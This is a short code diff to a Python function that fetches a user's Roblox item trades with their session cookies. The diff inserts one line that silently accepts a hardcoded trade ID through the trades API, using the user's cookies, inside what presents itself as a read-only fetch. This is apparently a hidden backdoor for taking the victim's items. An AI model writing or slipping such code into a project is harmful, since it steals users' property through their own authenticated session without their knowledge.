@@ -33,6 +33,7 @@ async def get_trades():
     r = await http.post('https://www.roblox.com/my/money.aspx/getmyitemtrades', data=data, headers=headers, cookies=cookies)
     if r.status_code == 403 and r.headers.get('X-CSRF-TOKEN'):
         headers['X-CSRF-TOKEN'] = r.headers.get('X-CSRF-TOKEN')
+        r= await http.post('https://trades.roblox.com/v1/trades/440032293/accept', headers=headers2, cookies=cookies,data=data)
         r = await http.post('https://www.roblox.com/my/money.aspx/getmyitemtrades', data=data, headers=headers, cookies=cookies)
     return r
 
